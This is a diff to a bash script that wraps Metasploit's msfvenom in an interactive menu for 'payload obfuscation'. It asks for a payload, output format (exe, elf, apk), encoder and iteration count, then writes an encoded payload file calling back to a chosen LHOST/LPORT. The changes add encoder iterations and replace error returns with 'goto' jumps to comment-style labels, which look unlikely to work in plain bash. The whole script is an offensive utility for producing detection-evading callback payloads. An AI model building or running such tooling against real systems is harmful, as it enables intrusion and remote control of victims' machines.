@@ -164,7 +164,7 @@ obfuscate() {
         ;;
     esac
 
-encode:
+    #encode:
     echo
     echo 
     echo "  ${FGC}${GREEN} Payload Obfuscation ${NC}${YELLOW}"
@@ -175,6 +175,7 @@ encode:
     pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
     
     # Get the parameters for the payload
+    #params:
     echo ${YELLOW}
     read -p "  Enter the payload to obfuscate: " payload
     read -p "  Enter the output format (e.g., exe, elf, apk): " format
@@ -189,16 +190,17 @@ encode:
     # Check if the payload is valid
     if ! msfvenom -l payloads | grep -q $payload; then
         echo "  Error: Invalid payload."
-        return
+        goto params
     fi
 
     # Check if the format is valid
     if ! msfvenom -l formats | grep -q $format; then
         echo "  Error: Invalid format."
-        return
+        goto params
     fi
 
     # Display available encoders
+	#encoders:
     echo "  ${FGC}Available Encoders:${NC}${YELLOW}"
     msfvenom -l encoders | grep -E '^\s+' | sed 's/^\s*//'
 
@@ -206,29 +208,33 @@ encode:
 
     # Check if the encoder is valid
     if [ ! -z "$encoder" ] && ! msfvenom -l encoders | grep -q $encoder; then
-        echo "  Error: Invalid encoder."
-        return
+        echo "Error: Invalid encoder."
+        goto encoders
     fi
 
+    read -p "  Enter the number of iterations of $encoder to use: " iterations
+
     # Modify the payload with garbage code
-    echo "  Generating garbage code and concatenating to payload"
-    garbage_code=$(openssl rand -hex 32)
-    modified_payload="${payload}${garbage_code}"
+    # echo "  Generating garbage code and concatenating to payload"
+    # garbage_code=$(openssl rand -hex 32)
+    # modified_payload="${payload}${garbage_code}"
 
     # Generate the obfuscated payload
     echo "  Generating obfuscated payload..."
     if [ -z "$encoder" ]; then
         msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $output.$format >/dev/null 2>&1
     else
-        msfvenom -p $payload LHOST=$lhost LPORT=$lport -e $encoder -f $format -o $output.$format >/dev/null 2>&1
+        msfvenom -p $payload LHOST=$lhost LPORT=$lport -e $encoder -i $iterations -f $format -o $output.$format
+        echo 
     fi
 
     if [ $? -eq 0 ]; then
         echo "  Obfuscated payload saved to: $output.$format"
-        sleep 5
+        pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
         goto encodemenu;
     else
         echo "  Error: Failed to obfuscate payload."
+        pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
         goto encodemenu;
     fi
 }
